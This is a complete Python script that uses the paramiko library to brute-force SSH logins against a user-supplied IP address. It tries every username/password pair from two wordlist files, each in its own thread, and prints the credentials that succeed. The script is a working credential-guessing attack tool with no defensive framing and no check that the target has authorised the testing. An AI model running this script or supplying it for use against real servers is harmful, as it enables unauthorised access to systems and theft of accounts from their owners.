import paramiko
import threading

def read_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

ip_address = input("Enter the IP address of the remote server: ")
usernames = read_file("usernames.txt")
passwords = read_file("passwords.txt")

def ssh_login(username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh_client.connect(ip_address, username=username, password=password)
        print(f"Login successful! Username: {username}, Password: {password}")
    except paramiko.AuthenticationException:
        print(f"Authentication failed for Username: {username}, Password: {password}")
    except paramiko.SSHException as e:
        print(f"An error occurred: {str(e)}")
    finally:
        ssh_client.close()

# Function for multi-threaded login attempts
def threaded_login():
    threads = []
    for username in usernames:
        for password in passwords:
            thread = threading.Thread(target=ssh_login, args=(username, password))
            thread.start()
            threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

# Call the multi-threaded login function
threaded_login()

